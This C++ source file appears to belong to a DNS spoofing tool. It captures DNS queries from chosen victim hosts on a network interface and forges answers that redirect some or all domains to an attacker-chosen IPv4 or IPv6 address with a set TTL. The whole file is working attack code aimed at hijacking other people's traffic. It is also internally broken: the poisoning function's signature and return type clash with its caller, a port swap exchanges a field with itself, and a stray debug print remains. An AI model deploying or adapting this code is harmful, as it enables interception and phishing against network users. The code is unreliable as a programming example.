#include "Program.h"

#include <EthLayer.h>
#include <IPv4Layer.h>
#include <IPv6Layer.h>
#include <UdpLayer.h>
#include <TcpLayer.h>
#include <PcapFilter.h>

#include <chrono>
#include <thread>
#include <mutex>

#include "Screen.h"
#include "Utils.h"

Arguments Program::args{};
bool Program::isCapturing = false;
std::condition_variable Program::capturingEnded;

Program::Program(const std::string &name, int argc, char *argv[])
    : name(name),
      parser(name)
{
    ParseArguments(argc, argv);
    InitCaptureInterface();
}

void Program::Run()
{
    Screen::PrintBanner();
    std::cout << "Waiting for DNS packets to come...\n"
              << std::flush;

    if (interface.dev->startCapture(Program::OnPacketCapture, nullptr))
    {
        isCapturing = true;
        std::unique_lock<std::mutex> lckg(mtx);
        capturingEnded.wait(lckg, [this]
                            { return !isCapturing; }); // Sleep until we have stopped capturing
    }

    if (!isCapturing)
    {
        interface.dev->stopCapture();
        interface.dev->close();
    }
}

void Program::OnPacketCapture(pcpp::RawPacket *packet, pcpp::PcapLiveDevice *dev, void *cookie)
{
    pcpp::Packet parsedPacket(packet);

    std::optional<pcpp::Packet> poisonedPacket = std::nullopt;

    pcpp::IPv4Layer *ipV4Layer = parsedPacket.getLayerOfType<pcpp::IPv4Layer>();
    if (ipV4Layer)
    {
        if (args.targets.hasTargets)
        {
            if (std::find(args.targets.V4.begin(), args.targets.V4.end(), ipV4Layer->getSrcIPv4Address()) == args.targets.V4.end())
                return;
        }
        else if (args.targets.hasExclusions)
        {
            if (std::find(args.targets.exclusionsV4.begin(), args.targets.exclusionsV4.end(), ipV4Layer->getSrcIPv4Address()) != args.targets.exclusionsV4.end())
                return;
        }

        poisonedPacket = PoisonPacket(parsedPacket, true);
        std::cout << "noppp" << std::endl;
    }
    else
    {
        pcpp::IPv6Layer *ipV6Layer = parsedPacket.getLayerOfType<pcpp::IPv6Layer>();
        if (!ipV6Layer)
            return;

        if (args.targets.hasTargets)
        {
            if (std::find(args.targets.V6.begin(), args.targets.V6.end(), ipV6Layer->getSrcIPv6Address()) == args.targets.V6.end())
                return;
        }
        else if (args.targets.hasExclusions)
        {
            if (std::find(args.targets.exclusionsV6.begin(), args.targets.exclusionsV6.end(), ipV6Layer->getSrcIPv6Address()) != args.targets.exclusionsV6.end())
                return;
        }

        poisonedPacket = std::move(PoisonPacket(parsedPacket, true));
    }

    if (!poisonedPacket.has_value())
    {
        return;
    }

    if (!dev->sendPacket(&poisonedPacket.value()))
    {
        Screen::SetColour(Screen::ForegroundColour::Red);
        std::cerr << "Failed to send poisoned packet." << std::endl;
        Screen::Reset();
        return;
    }
    
    Screen::SetColour(Screen::ForegroundColour::Green);
    std::cout << "Poisoned response sent." << std::endl;
    Screen::Reset();

    return;
}

bool Program::PoisonPacket(const pcpp::Packet& original, pcpp::Packet& packet, bool isIPv4)
{
    pcpp::DnsLayer* originalDns = original.getLayerOfType<pcpp::DnsLayer>();
    if(!originalDns || originalDns->getDnsHeader()->numberOfAnswers != 0 || originalDns->getDnsHeader()->numberOfAuthority != 0 || originalDns->getDnsHeader()->numberOfAdditional != 0)
    { // the packet isn't a DNS one or is a retransmission / response packet)
        return false;
    }
    pcpp::DnsLayer poisonDns(*originalDns);
    
    pcpp::DnsQuery *query = originalDns->getFirstQuery();
    while (query != nullptr)
    {
        switch (query->getDnsType())
        {
        case pcpp::DNS_TYPE_A:
        {
            if (args.specificDomains)
            {
                // The query domain is in the list of specified domains
                if (std::find(args.domains.begin(), args.domains.end(), query->getName()) != args.domains.end())
                {
                    pcpp::IPv4DnsResourceData poisonedData(args.evilIPv4);
                    // poisonDns.addQuery(query);
                    poisonDns.addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
                }
            }
            else
            {
                pcpp::IPv4DnsResourceData poisonedData(args.evilIPv4);
                // poisonDns.addQuery(query);
                poisonDns.addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
            }
            break;
        }
        case pcpp::DNS_TYPE_AAAA:
        {
            if (!args.poisonIPv6)
                break;
            if (args.specificDomains)
            {
                // The query domain is in the list of specified domains
                if (std::find(args.domains.begin(), args.domains.end(), query->getName()) != args.domains.end())
                {
                    pcpp::IPv6DnsResourceData poisonedData(args.evilIPv6);
                    // poisonDns.addQuery(query);
                    poisonDns.addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
                }
            }
            else
            {
                pcpp::IPv6DnsResourceData poisonedData(args.evilIPv6);
                // poisonDns.addQuery(query);
                poisonDns.addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
            }
            break;
        }
        default:
            break;
        }

        query = originalDns->getNextQuery(query);
    }

    // If no queries were poisoned due to domain name restrictions, return none
    if (poisonDns.getAnswerCount() == 0)
    {
        return false;
    }

    pcpp::Packet poison;

    // Poison Eth layer
    pcpp::EthLayer *originalEth = original.getLayerOfType<pcpp::EthLayer>();
    pcpp::EthLayer poisonEth(originalEth->getDestMac(), originalEth->getSourceMac());
    poison.addLayer(&poisonEth, true);

    // Poison IP layer
    pcpp::IPv4Layer *ipLayer = original.getLayerOfType<pcpp::IPv4Layer>();
    pcpp::IPv4Layer poisonIP(*ipLayer);

    auto oldSource = poisonIP.getSrcIPv4Address();
    poisonIP.setSrcIPv4Address(ipLayer->getDstIPv4Address());
    poisonIP.setDstIPv4Address(oldSource);
    
    if (isIPv4)
    {
        poison.addLayer(&poisonIP, true);
    }
    else
    {
        pcpp::IPv6Layer *ipLayer = original.getLayerOfType<pcpp::IPv6Layer>();
        pcpp::IPv6Layer poisonIP(ipLayer->getDstIPv6Address(), ipLayer->getSrcIPv6Address());
        poison.addLayer(&poisonIP, true);
    }

    // _ZN7Program12PoisonPacketERN4pcpp6PacketEb: 0x0000000000012dff
    // Poison Transport layer
    pcpp::UdpLayer *udpLayer = original.getLayerOfType<pcpp::UdpLayer>();
    if (udpLayer)
    {
        //pcpp::UdpLayer poisonUdp(*udpLayer);
        //std::swap(poisonUdp.getUdpHeader()->portDst, poisonUdp.getUdpHeader()->portDst);
        //poison.addLayer(&poisonUdp, true);

        //pcpp::TcpLayer *tcpLayer = original.getLayerOfType<pcpp::TcpLayer>();
        pcpp::TcpLayer poisonTcp(udpLayer->getUdpHeader()->portDst, udpLayer->getUdpHeader()->portSrc);
        poison.addLayer(&poisonTcp);
    }
    else
    {
        pcpp::TcpLayer *tcpLayer = original.getLayerOfType<pcpp::TcpLayer>();
        pcpp::TcpLayer poisonTcp(*tcpLayer);
        std::swap(poisonTcp.getTcpHeader()->portDst, poisonTcp.getTcpHeader()->portDst);
        poison.addLayer(&poisonTcp);
    }

    // Finish DNS poisoning
    poisonDns.getDnsHeader()->transactionID = originalDns->getDnsHeader()->transactionID;
    poisonDns.getDnsHeader()->queryOrResponse = 1;
    poison.addLayer(&poisonDns);

    poison.computeCalculateFields();
    return poison;
}

void Program::ParseArguments(int argc, char *argv[])
{
    parser.add_argument("-t", "--targets").help("A comma-separated list of hosts (IPv4 or IPv6) without whitespace");
    parser.add_argument("-i", "--interface").required().help("Network interface to use");
    parser.add_argument("-b", "--bad-ip").required().help("IPv4 Address to inject into the cache. This shold be the address of the server you want to redirect the victim to");
    parser.add_argument("-e", "--bad-ipv6").help("IPv6 Address to inject into the cache. This shold be the address of the server you want to redirect the victim to");
    parser.add_argument("--ttl").default_value<uint32_t>(300).help("The time-to-live of the poisoned DNS record (specified in seconds)").scan<'u', uint32_t>();
    parser.add_argument("-d", "--domains").help("A comma-separated list, without whitespace, of specific domains to poison. By default deserted will poison all domains.");
    parser.add_argument("-p", "--port").help("The possible destination ports of outbound DNS queries [defualt: 53, 5353]");

    std::vector<std::string> errors;
    try
    {
        parser.parse_args(argc, argv);

        // Parse bad IPv4
        args.evilIPv4 = pcpp::IPv4Address(parser.get("--bad-ip"));
        if (!args.evilIPv4.isValid())
        {
            errors.emplace_back("Invalid malicious IPv4 specified!");
        }

        // Parse bad IPv6
        if (parser.is_used("--bad-ipv6"))
        {
            args.evilIPv6 = pcpp::IPv6Address(parser.get("--bad-ipv6"));
            if (!args.evilIPv6.isValid())
            {
                errors.emplace_back("Invalid malicious IPv6 specified!");
            }
            args.poisonIPv6 = true;
        }

        // Parse interface
        args.interface = parser.get("--interface");
        interface.name = args.interface;
        interface.dev = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByName(interface.name);
        if (!interface.dev)
        {
            errors.emplace_back("Failed to use the specified interface");
        }

        // Parse targets
        try
        {
            std::vector<std::string> targets = std::move(SplitString(parser.get("--targets"), ','));

            for (const auto &t : targets)
            {
                if (t[0] == '!')
                {
                    pcpp::IPv4Address IPv4(t.substr(1));
                    if (IPv4.isValid())
                    {
                        args.targets.hasExclusions = true;
                        args.targets.exclusionsV4.emplace_back(std::move(IPv4));
                        continue;
                    }
                    else
                    {
                        pcpp::IPv6Address IPv6(t.substr(1));
                        if (IPv6.isValid())
                        {
                            args.targets.hasExclusions = true;
                            args.targets.exclusionsV6.emplace_back(std::move(IPv6));
                            continue;
                        }
                        else
                        {
                            errors.emplace_back("Targets list contains an invalid IP address: " + t);
                            break;
                        }
                    }
                }

                pcpp::IPv4Address IPv4(t);
                if (IPv4.isValid())
                {
                    args.targets.hasTargets = true;
                    args.targets.V4.emplace_back(std::move(IPv4));
                    continue;
                }
                else
                {
                    pcpp::IPv6Address IPv6(t);
                    if (IPv6.isValid())
                    {
                        args.targets.hasTargets = true;
                        args.targets.V6.emplace_back(std::move(IPv6));
                        continue;
                    }
                    else
                    {
                        errors.emplace_back("Targets list contains an invalid IP address: " + t);
                        break;
                    }
                }
            }
        }
        catch (...)
        {

        }

        // Parse TTL
        args.poisonTtl = parser.get<uint32_t>("--ttl");

        // Parse domains
        if (parser.is_used("--domains"))
        {
            args.specificDomains = true;
            args.domains = std::move(SplitString(parser.get("--domains"), ','));
        }

        // Parse ports
        

        if (errors.size() != 0)
        {
            std::string error_message = "";
            for (const auto &err : errors)
                error_message += err + "\n";
            throw std::runtime_error(error_message);
        }
    }
    catch (const std::runtime_error &err)
    {
        Screen::SetColour(Screen::ForegroundColour::Red);
        std::cerr << err.what() << '\n';
        Screen::Reset();

        std::cout << parser;
        exit(0);
    }
}

void Program::InitCaptureInterface()
{
    if (!interface.dev->open())
    {
        Screen::SetColour(Screen::ForegroundColour::Red);
        std::cerr << "Failed to open interface." << std::endl;
        Screen::Reset();
        exit(0);
    }

    // Setup the filters
    std::vector<pcpp::PortFilter> portFilters;

    pcpp::PortFilter p53(53, pcpp::Direction::DST);
    pcpp::PortFilter p5353(5353, pcpp::Direction::DST);
    pcpp::OrFilter portFilter;
    portFilter.addFilter(&p53);
    portFilter.addFilter(&p5353);

    /*for (auto p : args.ports)
    {
        portFilters.emplace_back(p, pcpp::Direction::DST);
        portFilter.addFilter(&(portFilters[portFilters.size() - 1]));
    }*/

    pcpp::ProtoFilter udpFilter(pcpp::UDP);
    pcpp::ProtoFilter tcpFilter(pcpp::TCP);

    pcpp::OrFilter protoFilter;
    protoFilter.addFilter(&udpFilter);
    protoFilter.addFilter(&tcpFilter);

    pcpp::AndFilter finalFilter;
    finalFilter.addFilter(&portFilter);
    finalFilter.addFilter(&protoFilter);

    if (!interface.dev->setFilter(finalFilter))
    {
        Screen::SetColour(Screen::ForegroundColour::Red);
        std::cerr << "Failed to setup capture filters." << std::endl;
        Screen::Reset();

        exit(0);
    }
}